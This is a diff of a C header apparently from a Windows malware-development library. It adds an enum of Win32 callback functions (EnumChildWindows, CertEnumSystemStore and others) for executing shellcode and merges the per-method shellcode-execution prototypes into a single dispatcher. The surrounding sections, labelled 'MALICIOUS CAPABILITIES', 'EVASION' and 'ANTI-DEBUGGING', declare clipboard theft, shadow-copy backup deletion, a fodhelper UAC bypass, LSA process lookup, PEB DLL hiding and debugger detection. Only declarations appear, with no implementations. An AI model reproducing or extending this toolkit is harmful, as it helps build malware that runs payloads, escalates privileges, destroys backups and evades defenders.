@@ -25,15 +25,35 @@
     Sei.Payload = Shellcode;
     Sei.dwLengthOfPayloadInBytes = 280 //whatever the length is
 
+    MethodEnum flag must be one of the values in the SHELLCODE_EXECUTION_METHOD enum
+    each enum indicates which win32 function to use for shellcode execution
+
 */
+
+typedef enum SHELLCODE_EXECUTION_METHOD {
+    E_CDEFFOLDERMENU_CREATE2 = 1,
+    E_CERTENUMSYSTEMSTORE, //2
+    E_CERTENUMSYSTEMSTORELOCATION, //3
+    E_CERTFINDCHAININSTORE, //4 NOT IMPLEMENTED!
+    E_ENUMCHILDWINDOWS, //5
+    E_ENUMDATEFORMATSW, //6
+    E_ENUMDESKTOPWINDOWS, //7
+    E_ENUMDESKTOPSW, //8
+    E_ENUMDIRTREEW, //9
+    E_ENUMDISPLAYMONITORS, //10
+    E_ENUMFONTFAMILIESEXW //11
+}SHELLCODE_EXECUTION_METHOD, *PSHELLCODE_EXECUTION_METHOD;
 typedef struct __SHELLCODE_EXECUTION_INFORMATION {
     LPBYTE Payload;
     DWORD dwLengthOfPayloadInBytes;
+    DWORD MethodEnum;
 }SHELLCODE_EXECUTION_INFORMATION, * PSHELLCODE_EXECUTION_INFORMATION;
 
 
 
-//error handling
+/*******************************************
+ ERROR HANDLING
+*******************************************/
 DWORD GetLastErrorFromTeb(VOID);
 NTSTATUS GetLastNtStatusFromTeb(VOID);
 VOID SetLastErrorInTeb(_In_ DWORD ErrorCode);
@@ -41,7 +61,11 @@ VOID SetLastNtStatusInTeb(_In_ NTSTATUS Status);
 DWORD Win32FromHResult(_In_ HRESULT Result);
 DWORD RtlNtStatusToDosErrorViaImport(_In_ NTSTATUS Status);
 
-//cryptography related
+
+
+/*******************************************
+ CRYPTOGRAPHY RELATED
+*******************************************/
 DWORD HashStringDjb2A(_In_ PCHAR String);
 DWORD HashStringDjb2W(_In_ PWCHAR String);
 ULONG HashStringFowlerNollVoVariant1aA(_In_ PCHAR String);
@@ -67,7 +91,10 @@ BOOL HashFileByMsiFileHashTableW(_In_ PWCHAR Path, _Inout_ PULONG FileHash);
 BOOL HashFileByMsiFileHashTableA(_In_ PCHAR Path, _Inout_ PULONG FileHash);
 
 
-//library loading
+
+/*******************************************
+ LIBRARY LOADING
+*******************************************/
 PTEB GetTeb(VOID);
 PPEB GetPeb(VOID);
 PPEB GetPebFromTeb(VOID);
@@ -87,7 +114,11 @@ BOOL RtlLoadPeHeaders(_Inout_ PIMAGE_DOS_HEADER* Dos, _Inout_ PIMAGE_NT_HEADERS*
 HMODULE GetModuleHandleEx2A(_In_ LPCSTR lpModuleName);
 HMODULE GetModuleHandleEx2W(_In_ LPCWSTR lpModuleName);
 
-//helper functions
+
+
+/*******************************************
+ HELPER FUNCTIONS
+*******************************************/
 BOOL IsPathValidA(_In_ PCHAR FilePath);
 BOOL IsPathValidW(_In_ PWCHAR FilePath);
 BOOL CreateLocalAppDataObjectPathW(_Inout_ PWCHAR pBuffer, _In_ PWCHAR Path, _In_ DWORD Size, _In_ BOOL bDoesObjectExist);
@@ -123,7 +154,11 @@ HMODULE TryLoadDllMultiMethodW(_In_ PWCHAR DllName);
 HMODULE TryLoadDllMultiMethodA(_In_ PCHAR DllName);
 DWORD CreateThreadAndWaitForCompletion(_In_ LPTHREAD_START_ROUTINE StartAddress, _In_ LPVOID Parameters, _In_ DWORD dwMilliseconds);
 
-//fingerprinting
+
+
+/*******************************************
+ FINGERPRINTING
+*******************************************/
 LCID GetCurrentLocaleFromTeb(VOID);
 DWORD GetNumberOfLinkedDlls(VOID);
 BOOL IsNvidiaGraphicsCardPresentA(VOID);
@@ -150,7 +185,11 @@ DWORD GetPidFromNtQueryFileInformationA(_In_ PCHAR FullBinaryPath);
 DWORD GetPidFromPidBruteForcingExW(_In_ PWCHAR ProcessNameWithExtension);
 DWORD GetPidFromPidBruteForcingExA(_In_ PCHAR ProcessNameWithExtension);
 
-//malicious capabilities
+
+
+/*******************************************
+ MALICIOUS CAPABILITIES
+*******************************************/
 DWORD OleGetClipboardDataA(_Inout_ PCHAR Buffer);
 DWORD OleGetClipboardDataW(_Inout_ PWCHAR Buffer);
 DWORD MpfComVssDeleteShadowVolumeBackups(_In_ BOOL CoUninitializeAfterCompletion);
@@ -160,18 +199,14 @@ BOOL UacBypassFodHelperMethodA(_In_ PCHAR PathToBinaryToExecute, _Inout_ PPROCES
 BOOL UacBypassFodHelperMethodW(_In_ PWCHAR PathToBinaryToExecute, _Inout_ PPROCESS_INFORMATION Pi);
 DWORD MpfGetLsaPidFromRegistry(VOID);
 DWORD MpfGetLsaPidFromServiceManager(VOID);
-BOOL ShellcodeExecViaCertEnumSystemStore(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaCDefFolderMenu_Create2(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaCertEnumSystemStoreLocation(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL _unstable__ShellcodeExecViaCertFindChainInStore(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaEnumChildWindows(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaEnumDateFormatsW(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaEnumDesktopWindows(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaEnumDesktopsW(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
-BOOL ShellcodeExecViaEnumDirTreeW(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
 DWORD MpfGetLsaPidFromNamedPipe(VOID);
+BOOL ShellcodeExecutionViaFunctionCallbackMain(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei);
 
-//evasion
+
+
+/*******************************************
+ EVASION
+*******************************************/
 BOOL CreateProcessWithCfGuardW(_Inout_ PPROCESS_INFORMATION Pi, _In_ PWCHAR Path);
 BOOL CreateProcessWithCfGuardA(_Inout_ PPROCESS_INFORMATION Pi, _In_ PCHAR Path);
 HRESULT CreateProcessFromIHxInteractiveUserW(_In_ PWCHAR UriFile);
@@ -191,7 +226,11 @@ DWORD CreateProcessViaNtCreateUserProcessA(PCHAR FullBinaryPath);
 BOOL RemoveDllFromPebA(_In_ LPCSTR lpModuleName);
 BOOL RemoveDllFromPebW(_In_ LPCWSTR lpModuleName);
 
-//antidebug
+
+
+/*******************************************
+ ANTI-DEBUGGING
+*******************************************/
 BOOL AdfCloseHandleOnInvalidAddress(VOID);
 BOOL AdfIsCreateProcessDebugEventCodeSet(VOID);
 BOOL AdfOpenProcessOnCsrss(VOID);
